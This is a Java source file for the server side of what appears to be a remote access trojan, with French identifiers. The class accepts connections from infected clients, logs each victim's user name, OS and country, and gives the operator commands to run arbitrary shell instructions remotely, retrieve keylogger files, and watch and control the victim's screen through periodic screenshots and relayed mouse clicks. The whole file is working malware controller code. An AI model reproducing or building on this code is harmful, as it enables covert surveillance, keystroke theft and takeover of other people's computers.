package master;

import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.TimeUnit;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.SwingUtilities;

import remote.action.BougerSouris;
import remote.action.ClickerSouris;
import remote.action.RemoteActions;
import remote.action.ScreenShot;
import send.specific.object.ReceivedSpecificObject;
import send.specific.object.receivedImage;
import constante.Constante;

public class Connexion {

	private Socket so;
	private String ip, os_name, numeroConnexion, pays, os_arch, os_version,
			user_name, file_separator;

	private ObjectInputStream in;
	private ObjectOutputStream out;
	private ArrayBlockingQueue<RemoteActions> remoteActionsQueue;
	private Affichage affichage;

	public Connexion(Socket so) throws ClassNotFoundException {
		super();
		this.so = so;
		try {
			out = new ObjectOutputStream(so.getOutputStream());

			in = new ObjectInputStream(new BufferedInputStream(
					so.getInputStream()));
			remoteActionsQueue = new ArrayBlockingQueue<RemoteActions>(20);
			String listInformation = (String) in.readObject();
			Server.log.enregistrerFichier("\n" + listInformation);

			String[] splited = listInformation.split("\\s+");
			setFile_separator(splited[1]);
			setUser_name(splited[2]);
			setOs_version(splited[3]);
			setOs_name(splited[4]);
			setOs_arch(splited[5]);
			setPays(splited[6]);
			setIp(so.getInetAddress().toString());
			send();
			receive();
		} catch (IOException e) {
			// TODO Auto-generated catch block
		}
	}

	private void send() throws IOException {
		Thread envoi = new Thread("Envoi") {
			@Override
			public void run() {
				try {
					while (true) {

						Scanner sc = new Scanner(System.in);
						String commande = sc.nextLine();
						commande = commande.trim();
						if (commande.equals("notif")) {
							out.writeObject(Constante.code_notif);
						} else if (commande.equals("vnc")) {
							affichage = new Affichage(); // Cree un nouvel
															// affichage

						} else if (commande.equals("cmd")) {
							String instruction_a_executer = sc.nextLine();
							instruction_a_executer = instruction_a_executer
									.trim();
							out.writeObject(Constante.code_cmd);
							out.flush();
							System.out.println("Envoi d'une requete");
							out.writeObject(instruction_a_executer);
							out.flush();
						} else if (commande.equals("quitter")) { // Quitter
							in.close();
							out.close();
							System.exit(0);
						} else if (commande.equals("keylog")) {
							// Recuperer un fichier de Keylog
							Server.log.enregistrerFichier(commande);
							out.writeObject(Constante.code_keylog);
							out.flush();
						} else {
							Server.log
									.enregistrerFichier("Commande inexistante a executer :"
											+ commande);
						}
					}
				} catch (Exception e) {
					Server.log.enregistrerFichier("Client s'est deconnecte :"+ip+" "+user_name);
				}
			}
		};
		envoi.start();
	}

	public void receive() {
		Thread reception = new Thread() {
			@Override
			public void run() {
				try {
					while (true) {

						Object action = in.readObject();
						if (action instanceof Integer) {
							Integer code = (Integer) action;
							if (code.equals(Constante.code_vnc)) {
								Server.log
										.enregistrerFichier("Recoit une image");
								affichage.setIcon();
							} else if (code.equals(Constante.code_cmd)) {
								Object object = in.readObject();
								if (object instanceof String) {
									String res = (String) object;
									System.out.println(res);
								}
							} else {
								Server.log
										.enregistrerFichier("Recoit un fichier");
								ReceivedSpecificObject.receivedFile(
										(Integer) action, in);
							}
						}

						else {
							Server.log
									.enregistrerFichier("Fichier inconnu par le serveur");
						}

					}
				} catch (Exception e) {
					System.out.println(ip + " s'est deconnecte");

				}
			}
		};
		reception.start();
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public Socket getSo() {
		return so;
	}

	public void setOs_name(String os_name) {
		this.os_name = os_name;
	}

	public void setPays(String pays) {
		this.pays = pays;
	}

	public void setOs_arch(String os_arch) {
		this.os_arch = os_arch;
	}

	public void setOs_version(String os_version) {
		this.os_version = os_version;
	}

	public void setUser_name(String user_name) {
		this.user_name = user_name;
	}

	public void setFile_separator(String file_separator) {
		this.file_separator = file_separator;
	}

	class Affichage extends JFrame {
		private final JLabel label = new JLabel();
		private final Timer timer;

		public Affichage() {

			setTitle(user_name);
			getContentPane().add(new JScrollPane(label));

			label.addMouseListener(new MouseAdapter() {
				@Override
				public void mouseClicked(MouseEvent e) {
					// TODO Auto-generated method stub
					super.mouseClicked(e);
					try {

						remoteActionsQueue.put(new BougerSouris(e));
						remoteActionsQueue.put(new ClickerSouris(e));
						remoteActionsQueue.put(new ScreenShot());

					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				}
			});
			setSize(Constante.WINDOW_WIDTH, Constante.WINDOW_HEIGHT);
			setVisible(true);
			Server.log.enregistrerFichier("Ajout d'un listener de la souris");

			timer = new Timer();
			timer.scheduleAtFixedRate(new TimerTask() {

				@Override
				public void run() {
					// TODO Auto-generated method stub
					try {
						remoteActionsQueue.put(new ScreenShot());
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}, 1, 2000);
			Server.log.enregistrerFichier("Ajout d'un timer");

			Thread envoi = new Thread() {
				@Override
				public void run() {
					while (true) {
						try {
							// System.out.println("[debug] Nouvel objet retire");
							RemoteActions ra = remoteActionsQueue.poll(3000,
									TimeUnit.MILLISECONDS);
							out.writeObject(ra);
							out.flush();
						} catch (InterruptedException | IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}
			};
			envoi.start();
			Server.log
					.enregistrerFichier("Ajout d'un thread pour envoyer des que c'est possible");

			addWindowListener(new WindowAdapter() {
				@Override
				public void windowClosing(WindowEvent e) {
					// TODO Auto-generated method stub
					super.windowClosing(e);
					timer.cancel();
				}
			});
			Server.log
					.enregistrerFichier("Ajout d'un listener quand on supprime la Windows");

		}

		public void setIcon() throws ClassNotFoundException, IOException {
			// TODO Auto-generated method stub

			BufferedImage image = receivedImage.receivedImage(in, true);
			SwingUtilities.invokeLater(new Runnable() {
				@Override
				public void run() {
					// TODO Auto-generated method stub
					label.setIcon(new ImageIcon(image));
					// setIconImage(image);
				}
			});
		}
	}

}
